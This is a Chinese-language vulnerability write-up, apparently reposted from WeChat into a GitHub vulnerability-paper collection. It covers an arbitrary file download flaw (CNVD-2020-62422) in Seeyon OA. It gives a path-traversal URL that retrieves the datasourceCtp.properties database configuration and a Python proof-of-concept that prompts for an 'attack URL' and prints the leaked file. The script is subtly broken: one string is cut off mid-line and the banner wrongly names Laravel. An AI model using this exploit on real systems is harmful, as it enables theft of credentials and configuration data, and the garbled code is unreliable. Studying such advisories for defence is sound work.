---
cnvd: "CNVD-2020-62422"
source: "MrWQ/vulnerability-paper"
---

# 致远 OA webmail-do 任意文件下载 CNVD-2020-62422

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/IHISaQzNGx9fUElERGZHMQ)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**一****：漏洞描述🐑**

致远 OA 存在任意文件下载漏洞，攻击者可利用该漏洞下载任意文件，获取敏感信息

**二:  漏洞影响🐇**

致远 OA A6-V5

致远 OA A8-V5

致远 OA G6

**三:  漏洞复现🐋**

访问 url  http://xxx.xxx.xxx.xxx/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties

存在漏洞的 OA 系统将会下载 **datasourceCtp.properties** 配置文件

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7sNA2oibfrEvLCia4dI2NZLL60769l4OlY9ydJw25wmqZP9Lds9GzIvE2yDZTbOsiagDjY6rViaKUJCQ/640?wx_fmt=png)

更改参数 filePath 可下载其他文件

 **四:  漏洞利用 POC🐋**

```
import requests
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mVersion: Laravel framework <= 5.5.21                              \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/seeyon/webmail.do?method=doDownloadAtt&file
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
        if "workflow" in response.text:
            print("\033[32m[o] 目标{}存在漏洞 \033[0m".format(target_url))
            print("\033[32m[o] 响应为:\n{} \033[0m".format(response.text))
        else:
            print("\033[31m[x] 文件请求失败 \033[0m")
            sys.exit(0)
    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)

if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7sNA2oibfrEvLCia4dI2NZLL9AsB5L6KluvInGeQz2gmQIiaAgwmCSuEAjaIyMzDYD5WekJFrC1ibavw/640?wx_fmt=png)

Goby & POC
----------

```
GOby POC 目录已经添加漏洞json文件，可以一键导入
致远OA webmail.do任意文件下载 CNVD-2020-62422
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7sNA2oibfrEvLCia4dI2NZLL9zzXadyzMOOxueB7KeOLq9wmjsJX7ShiavJib51FLx8v7VeAYwt70Y8g/640?wx_fmt=png)

最后
--

> 下面就是文库和团队的公众号啦，更新的文章都会在第一时间推送在公众号
> 
> 别忘了 Github 下载完给个小星星⭐

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro75IHato7k7WJakCwObVtic8kOiagRSTylHIhHxg4DVKOhBFDazKkCMgvw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el6wnKTQvK0n8sFOQEEFQro7uWKGayI2RguaLia8VfTDystgmyZaEk15WcXU9v4WtULgysUGicYFGMQA/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
